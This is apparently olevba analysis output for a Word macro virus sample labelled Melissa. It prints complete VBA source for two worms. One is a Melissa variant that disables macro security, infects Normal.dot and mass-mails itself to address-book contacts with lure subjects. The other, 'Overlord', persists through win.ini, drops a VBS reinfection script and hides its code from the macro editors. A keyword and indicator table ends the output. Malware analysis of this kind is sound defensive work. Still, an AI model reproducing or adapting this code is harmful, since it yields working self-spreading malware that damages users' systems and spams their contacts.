olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.ah-6c97bb6d4b3ed4f6f3099c007fb134bd361fb039
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Empirical.cls 
in file: Virus.MSWord.Melissa.ah-6c97bb6d4b3ed4f6f3099c007fb134bd361fb039 - OLE stream: 'Macros/VBA/Empirical'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
  On Error Resume Next
  Call Empirical
End Sub
Private Sub Document_New()
  On Error Resume Next
  Call Empirical
End Sub
Private Sub AutoExec()
  On Error Resume Next
  Call Empirical
End Sub
Private Sub Empirical()
  'based on or guided by experience,
  'experiment or observation,
  'as distinct from theory.
  On Error Resume Next
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  Else
    CommandBars("Tools").Controls("Macro").Enabled = False
    Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
  End If
  CommandBars("Visual Basic").Enabled = False

  Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
  Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
  NTCL = NTI1.CodeModule.countoflines
  ADCL = ADI1.CodeModule.countoflines
  BGN = 2

  If ADI1.Name <> "Empirical" Or ADCL < 20 Then
    If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL
    Set toinfect = ADI1
    ADI1.Name = "Empirical"
    DoAD = True
  End If

  If NTI1.Name <> "Empirical" Or NTCL < 20 Then
    If NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL
    Set toinfect = NTI1
    NTI1.Name = "Empirical"
    DoNT = True
  End If

  If DoNT <> True And DoAD <> True Then GoTo BYE

  If DoNT = True Then
    toinfect.CodeModule.addfromstring ("Private Sub Document_Open()" & vbCrLf & ADI1.CodeModule.Lines(2, ADI1.CodeModule.countoflines))
  End If

  If DoAD = True Then
    toinfect.CodeModule.addfromstring ("Private Sub Document_Close()" & vbCrLf & NTI1.CodeModule.Lines(2, NTI1.CodeModule.countoflines))
  End If

BYE:
  Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
  Set UngaDasOutlook = CreateObject("Outlook.Application")
  Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Profiles") <> "Empirical" Then
    If UngaDasOutlook = "Outlook" Then
      DasMapiName.Logon "profile", "password"
      For y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(y)
        x = 1
        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
          Peep = AddyBook.AddressEntries(x)
          BreakUmOffASlice.Recipients.Add Peep
          x = x + 1
          If x > 50 Then oo = AddyBook.AddressEntries.Count
        Next oo
        s = Int(Rnd * 7)
        Select Case s
          Case 0
            BreakUmOffASlice.Subject = "Question for you..."
            BreakUmOffASlice.Body = "It's fairly complicated so I've attached it."
          Case 1
            BreakUmOffASlice.Subject = "Check this!!"
            BreakUmOffASlice.Body = "This is some wicked stuff!"
          Case 2
            BreakUmOffASlice.Subject = "Cool Web Sites"
            BreakUmOffASlice.Body = "Check out the Attached Document for a list of some of the best Sites on the Web"
          Case 3
            BreakUmOffASlice.Subject = "80mb Free Web Space!"
            BreakUmOffASlice.Body = "Check out the Attached Document for details on how to obtain the free space.  It's cool, I've now got heaps of room."
          Case 4
            BreakUmOffASlice.Subject = "Cheap Software"
            BreakUmOffASlice.Body = "The attached document contains a list of web sites where you can obtain Cheap Software"
          Case 5
            BreakUmOffASlice.Subject = " Cheap Hardware"
            BreakUmOffASlice.Body = " I've attached a list of web sites where you can obtain Cheap Hardware"
          Case 6
            BreakUmOffASlice.Subject = "Free Music"
            BreakUmOffASlice.Body = " Here is a list of places where you can obtain Free Music."
          Case 7
            s1 = Int(Rnd * 126) + 32
            BreakUmOffASlice.Subject = Chr$(s1) & " Free Downloads"
            BreakUmOffASlice.Body = " Here is a list of sites where you can obtain Free Downloads."
        End Select
        BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
        BreakUmOffASlice.Send
        Peep = ""
      Next y
    DasMapiName.Logoff
    End If
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Profiles") = "Empirical"
  End If
  
  If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
  ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
    ActiveDocument.Saved = True
  End If
  If Minute(Now) = Hour(Now) Then Selection.TypeText " All empires fall, you just have to know where to push. ": ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: ActiveDocument.Saved = True:  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Profiles") = ""
End Sub




























































-------------------------------------------------------------------------------
VBA MACRO Module.bas 
in file: Virus.MSWord.Melissa.ah-6c97bb6d4b3ed4f6f3099c007fb134bd361fb039 - OLE stream: 'Macros/VBA/Module'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()

'MyName = Overlord
'WrittenBy = f0re [UC/Skamwerks/DVC]
'Version = .B (1.1)

On Error Resume Next

windir = Environ("windir")
If Dir(windir & "\tempad.dll") <> "" Then Kill (windir & "\tempad.dll")
If Dir(windir & "\tempnt.dll") <> "" Then Kill (windir & "\tempnt.dll")

Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False

If NormalTemplate.VBProject.VBComponents.Item("Module").CodeModule.Lines(3, 1) <> "'MyName = Overlord" Then
ActiveDocument.VBProject.VBComponents("Module").Export (windir & "\tempad.dll")
NormalTemplate.VBProject.VBComponents.import (windir & "\tempad.dll")
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item("Module").CodeModule.Lines(3, 1) <> "'MyName = Overlord" Then
NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\tempnt.dll")
ActiveDocument.VBProject.VBComponents.import (windir & "\tempnt.dll")
ActiveDocument.SaveAs ActiveDocument.FullName
End If

If Dir("c:\Himem.sys") <> "" Then
Open "c:\Himem.sys" For Input As #1
Open "c:\Himem.sy_" For Output As #2
Do While Not EOF(1)
 Input #1, Line
 If Line <> ActiveDocument.FullName Then Print #2, Line
Loop
Close #1
Close #2

Kill ("c:\Himem.sys")
FileCopy "c:\Himem.sy_", "c:\Himem.sys"
Kill ("c:\Himem.sy_")
End If

End Sub
Sub AutoOpen()

On Error Resume Next
windir = Environ("windir")

Open "c:\Himem.sys" For Append As #1
Print #1, ActiveDocument.FullName
Close #1

End Sub

Sub Stealth()
On Error Resume Next

windir = Environ("windir")

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\software\", "RegisteredOwner") = "the Overlord"

Open windir & "\win.ini" For Input As #1
Open "c:\win._ni" For Output As #2
Do While Not EOF(1)
 Line Input #1, Line
 If Line = "[windows]" Then
  Print #2, Line
  Print #2, "run = " & windir & "\overlord.b.vbs"
 Else
  Print #2, Line
 End If
Loop
Close #1
Close #2

FileCopy "c:\win._ni", windir & "\win.ini"
Kill ("c:\win._ni")

If Dir(windir & "\overlord.b.vbs") <> "" Then Kill (windir & "\overlord.b.vbs")

Open "c:\windows\overlord.b.vbs" For Append As #1
Print #1, "On error resume next"
Print #1, ""
Print #1, "Set WordObj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "WordObj.Options.SaveNormalPrompt = False"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(" & Chr(34) & "Module" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (" & Chr(34) & windir & "\overlord.b.dll" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, ""
Print #1, "Dim FSO"
Print #1, "Set FSO = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.sys" & Chr(34) & ", 1, True)"
Print #1, "contents = a.readall()"
Print #1, "a.close"
Print #1, "set b =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.dll" & Chr(34) & ", 2, True)"
Print #1, "b.write(contents)"
Print #1, "b.close"
Print #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.dll" & Chr(34) & ", 1, True)"
Print #1, "Do While a.atendofstream <> True"
Print #1, "documentname = a.readline"
Print #1, "If documentname <> " & Chr(34) & Chr(34) & " then"
Print #1, "WordObj.Documents.open (documentname)"
Print #1, "WordObj.activedocument.save"
Print #1, "WordObj.activedocument.close"
Print #1, "End if"
Print #1, "Loop"
Print #1, "a.close"
Print #1, "set NT = " & Chr(34) & Chr(34)
Print #1, "WordObj.Quit"
Print #1, "fso.deletefile" & Chr(34) & "c:\himem.sys" & Chr(34)
Print #1, "fso.deletefile" & Chr(34) & "c:\himem.dll" & Chr(34)
Close #1

NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\overlord.b.dll")

End Sub
Sub ViewVBCode()
On Error Resume Next

Call Stealth

NormalTemplate.VBProject.VBComponents("Module").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.countoflines
NormalTemplate.Saved = True
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("Module")
NormalTemplate.Saved = True

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
For x = 1 To Docnumber
Documents(x).VBProject.VBComponents("Module").CodeModule.DeleteLines 1, Documents(x).VBProject.VBComponents("Module").CodeModule.countoflines
Documents(x).Saved = True
Documents(x).VBProject.VBComponents.Remove Documents(x).VBProject.VBComponents("Module")
Documents(x).Saved = True
Next x
End If

Application.ShowVisualBasicEditor = True

End Sub
Sub ToolsMacro()
On Error Resume Next

For x = 1 To NormalTemplate.VBProject.VBComponents("Module").CodeModule.countoflines
 codeNT = codeNT & NormalTemplate.VBProject.VBComponents("Module").CodeModule.Lines(x, 1) & Chr(13)
Next x
NormalTemplate.VBProject.VBComponents("Module").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.countoflines
NormalTemplate.Saved = True

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
 For y = 1 To ActiveDocument.VBProject.VBComponents("Module").CodeModule.countoflines
  CodeAD = CodeAD & ActiveDocument.VBProject.VBComponents("Module").CodeModule.Lines(y, 1) & Chr(13)
 Next y
 For x = 1 To Docnumber
 Documents(x).VBProject.VBComponents("Module").CodeModule.DeleteLines 1, Documents(x).VBProject.VBComponents("Module").CodeModule.countoflines
 Documents(x).Saved = True
 Next x
End If

Application.Dialogs(wdDialogToolsMacro).Show

If Application.ShowVisualBasicEditor = False Then
 NormalTemplate.VBProject.VBComponents("Module").CodeModule.InsertLines 1, codeNT
 NormalTemplate.Save
 
If Docnumber >= 1 Then
For x = 1 To Docnumber
Documents(x).VBProject.VBComponents("Module").CodeModule.InsertLines 1, CodeAD
Documents(x).SaveAs Documents(x).FullName
Next x
End If
End If
End Sub

'Put this code in a module called "Module". This is another version of overlord.
'It uses a different stealth mechanism. Again however not perfect stealth,
'but perhaps also a nice attempt i hope :).




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |tempad.dll          |Executable file name                         |
|IOC       |tempnt.dll          |Executable file name                         |
|IOC       |b.vbs               |Executable file name                         |
|IOC       |b.dll               |Executable file name                         |
|IOC       |himem.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+
